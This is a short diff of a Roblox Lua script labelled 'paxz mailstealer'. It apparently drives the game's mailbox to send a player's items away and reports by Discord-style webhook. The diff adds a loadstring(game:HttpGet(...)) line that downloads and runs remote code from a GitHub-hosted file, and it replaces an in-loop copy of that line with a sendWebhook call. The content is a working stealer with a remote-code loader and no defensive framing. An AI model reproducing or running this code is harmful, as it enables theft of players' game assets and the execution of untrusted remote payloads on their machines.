@@ -1,5 +1,5 @@
 --paxz mailstealer
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/WebhookMaiblox.lua"))()
 local UserInputService = game:GetService("UserInputService")
 UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
 
@@ -61,7 +61,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/WebhookMaiblox.lua"))()
+        sendWebhook(_G.Webhook, "")
         dims = 0
         wait(7)
     end
